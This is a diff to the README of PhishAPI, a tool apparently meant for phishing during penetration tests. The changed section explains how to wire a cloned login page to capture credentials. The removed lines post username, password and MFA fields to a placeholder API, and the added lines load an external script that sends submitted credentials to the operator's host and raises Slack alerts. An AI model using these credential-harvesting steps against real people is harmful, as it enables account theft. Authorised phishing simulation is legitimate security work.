@@ -77,33 +77,17 @@ Rapid & Easy Deployment API for Phishing During Pentest Engagements.  Output to 
 
 ## OR
 
-<b>If you don't wish to use a pre-populated landing page template, feel free to create or clone your own.  Just add the following HTML tags to leverage the API for alerting and credential capturing : </b><br><br>
+<b>If you don't wish to use a pre-populated landing page template or one doesn't exist that you would like to use, feel free to create or clone your own.  Simply : </b><br><br>
 
-1) Point your HTML Form to https://YOUR-API-HERE
+1) Add the external script source in the <head> element
 
-	`<FORM METHOD="POST" ACTION="https://YOUR-API-HERE">`
+	`<script src="https://YOUR_PHISHAPI_URL.com/APICredentialFormSubmit.js"></script>`
 
-2)  Make sure the following authentication fields are set
+2)  Change or add an "onclick" attribute to the submit button for the login form and fill out the arguments
 
-	`<INPUT NAME="username">`
+	`<buttom value="Submit!" onclick="SubForm('PhishAPI_URL_HERE','NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME',':fishing_pole_and_fish:','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">`
 	
-	`<INPUT NAME="password">`
-	
-	`<INPUT NAME="token">` <b>(OPTIONAL MFA FIELD)</b>  
-	
-3) Add hidden input fields for the name of the project and the URL the users should be redirected to after submitting their credentials to you (Recommend Legitimate Login Location - For Best Results Use a Clickjacking Vulnerable URL That Allows iframes)
-
-	`<INPUT NAME="project" VALUE="My_Project_Here" TYPE="hidden">`
-	
-	`<INPUT NAME="redirect" VALUE="https://site_to_redirect_to" TYPE="hidden">`
-	
-4) Optionally include hidden input fields for altering the Slack bot's behavior (Name and Emoji)
-
-	`<INPUT NAME="slackbotname" VALUE="PhishBot" TYPE="hidden">`
-	
-	`<INPUT NAME="slackemoji" VALUE=":fishing_pole_and_fish:" TYPE="hidden">`
-	
-5) Sit back and wait for the Slack bot to notify you.  When you want to see the credentials visit https://YOUR-API-HERE/results using your basic auth credentials or click the link in the Slack notification.<br><br>
+3) Sit back and wait for the Slack bot to notify you.  When you want to see the credentials visit https://YOUR-API-HERE/results using your basic auth credentials or click the link in the Slack notification.<br><br>
 
 <p align="center">
 <img src="https://i.imgur.com/L8yYRMQ.png" width="70%"><br />
